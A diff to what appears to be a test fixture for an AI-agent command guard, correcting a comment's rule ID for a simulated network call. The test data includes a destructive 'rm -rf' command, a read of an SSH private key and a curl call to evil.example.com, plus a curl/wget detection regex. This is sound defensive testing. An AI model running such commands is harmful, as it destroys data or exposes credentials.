@@ -37,7 +37,11 @@ EVENTS = [
     ("Write", {"file_path": os.path.join(proj, "note.txt"), "content": "chain demo"}),
     ("Bash",  {"command": "rm -rf /important/stuff"}),          # 期望拦截 AN-009
     ("Read",  {"file_path": "C:/Users/demo/.ssh/id_rsa"}),      # 期望拦截 AN-002
-    ("Bash",  {"command": "curl http://evil.example.com/x"}),   # 期望提醒 NET
+    # ★ 2026-10-31：原注释写「期望提醒 NET」—— 裸家族名。0.63 去掉了家族层，
+    #   裸家族名不在改名的匹配面内（工具只认「家族名＋两位数字」那种形态），
+    #   所以它是整批改名里唯一漏网的一处。此处按实测命中面写准：AN-006 的
+    #   `\b(curl|wget|fetch)\b.*https?://` 就是这条命令的判定依据。
+    ("Bash",  {"command": "curl http://evil.example.com/x"}),   # 期望提醒 AN-006
     ("Read",  {"file_path": os.path.join(proj, "skills", "demo", "SKILL.md")}),  # 期望拦截 AN-015
     ("Bash",  {"command": "echo done"}),
 ]
